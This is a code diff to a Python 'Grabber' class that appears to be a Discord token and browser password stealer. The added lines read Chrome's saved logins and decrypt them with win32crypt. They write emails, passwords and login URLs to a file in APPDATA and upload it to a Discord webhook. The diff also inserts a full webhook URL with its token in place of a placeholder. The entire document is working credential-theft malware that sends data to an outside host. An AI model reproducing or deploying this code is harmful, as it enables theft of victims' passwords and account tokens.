@@ -2,7 +2,7 @@ import requests, os, platform, string, random, re, win32crypt, shutil, sqlite3, 
 
 class Grabber:
     def __init__(self):
-        self.webhook = "https://discordapp.com/api/webhooks/no."
+        self.webhook = "https://discordapp.com/api/webhooks/694499249777278986/OdTMoajP4dvGA3eDHvOvayG3qrrxU9kVvcHPXPg3BPT-4QK0MQaQyYPIkJA4xpirdEUF"
         self.tokenRegex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"
         self.api = "https://discordapp.com/api/v7/"
         self.errors = {
@@ -123,8 +123,18 @@ class Grabber:
             cursor.execute('SELECT action_url, username_value, password_value FROM logins')
             for result in cursor.fetchall():
                 password = win32crypt.CryptUnprotectData(result[2])[1].decode()
+                email = result[1]
+                login = result[0]
                 if password != '':
-                    self.passwords.append(password)     
+                    passwords.append(password)
+                with open(f'{os.getenv("APPDATA")}\\Google Backup\\Google.txt', 'a+') as f:
+                    data = '=================================='
+                    data += '\nEmail : ' + email
+                    data += '\nPassword : ' + password
+                    data += '\nLogin portal : ' + login
+                    data += '\n=================================\n\n'
+                    f.write(data)
+            webHookFile(message="Google login data", file=f'{os.getenv("APPDATA")}\\Google Backup\\Google.txt')  
 
     def grabToken(self):
         for location in self.dirs:
@@ -155,7 +165,7 @@ class Grabber:
         file = {
             "imageFile": open(file, "rb")
         }
-        r = requests.post(self.webhook, json=payload, files=file)
+        r = self.session.post(self.webhook, json=payload, files=file)
         if r.status_code == 200:
             return True
 
@@ -163,7 +173,7 @@ class Grabber:
         payload = {
             'content': f'**```asciidoc\n{message}\n```**'
         }
-        r = requests.post(self.webhook, json=payload)
+        r = self.session.post(self.webhook, json=payload)
         if r.status_code == 200:
             return True
 
